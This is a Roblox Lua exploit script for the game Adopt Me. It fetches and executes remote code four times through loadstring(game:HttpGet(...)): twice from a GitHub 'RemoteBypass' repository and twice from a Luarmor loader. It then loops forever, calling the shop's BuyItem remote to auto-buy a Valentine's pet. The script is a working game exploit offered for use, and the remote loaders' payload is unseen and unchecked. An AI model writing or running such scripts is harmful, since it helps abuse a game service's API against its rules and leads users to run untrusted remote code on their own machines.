wait(0.1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(0.1)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
wait(0.1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(0.1)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
wait(0.1)
local args = {
    [1] = "pets",
    [2] = "valentines_2025_love_bird",
    [3] = {
        ["buy_count"] = 2
    }
}

while true do
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
    wait(5)  -- Wait for 5 seconds before repeating the entire cycle
end

